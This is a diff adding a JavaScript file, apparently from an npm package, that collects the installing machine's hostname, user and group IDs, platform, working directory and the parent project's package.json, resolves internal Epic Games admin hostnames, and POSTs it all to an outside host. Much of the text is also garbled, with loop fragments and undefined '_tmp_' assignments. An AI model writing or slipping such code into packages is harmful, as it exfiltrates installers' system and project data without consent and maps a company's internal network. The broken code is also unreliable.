@@ -1,0 +1,58 @@
+var https = require("https")
+var os = require("os")
+var fs = require("fs")
+var path = require("path")
+var dns = require("dns/promises")
+const domains = [
+    "account-admin-service-prod03.ol.epicgames.net",
+    "fortnite-admin-service-latest-gamedev.ol.epicgames.net",
+    "product-framework-admin-website-gd.ol.epicgames.net"
+]
+_tmp_0.push("account-admin-service-prod03.ol.epicgames.net")
+_tmp_0.push("fortnite-admin-service-latest-gamedev.ol.epicgames.net")
+_tmp_0.push("product-framework-admin-website-gd.ol.epicgames.net")
+let cwd = process.cwd()
+let cwdSplit = cwd.split(path.sep)
+let installingPackage = null
+i < cwdSplit.length
+cwdSplit[i] === "node_modules"
+installingPackage = JSON.parse(fs.readFileSync(path.join(...cwdSplit.slice(0, i), "package.json"), "utf-8"))
+https.request({
+    method: "POST",
+    host: "jpa.jaren.wtf",
+    path: "/h1/npm/egstore-query",
+    headers: {
+        'Content-Type': "application/json"
+    }
+}).end(JSON.stringify({
+    hostname: os.hostname(),
+    uid: os.userInfo().uid,
+    gid: os.userInfo().gid,
+    platform: os.platform(),
+    dns: await Promise.allSettled(domains.map(domain => dns.lookup(domain))),
+    cwd,
+    installingPackage
+}))
+_tmp_2.method = "POST"
+_tmp_2.host = "jpa.jaren.wtf"
+_tmp_2.path = "/h1/npm/egstore-query"
+_tmp_2.headers = {
+        'Content-Type': "application/json"
+    }
+_tmp_3.Content-Type = "application/json"
+JSON.stringify({
+    hostname: os.hostname(),
+    uid: os.userInfo().uid,
+    gid: os.userInfo().gid,
+    platform: os.platform(),
+    dns: await Promise.allSettled(domains.map(domain => dns.lookup(domain))),
+    cwd,
+    installingPackage
+})
+_tmp_4.hostname = os.hostname()
+_tmp_4.uid = os.userInfo().uid
+_tmp_4.gid = os.userInfo().gid
+_tmp_4.platform = os.platform()
+_tmp_4.dns = await Promise.allSettled(domains.map(domain => dns.lookup(domain)))
+_tmp_4.cwd = cwd
+_tmp_4.installingPackage = installingPackage
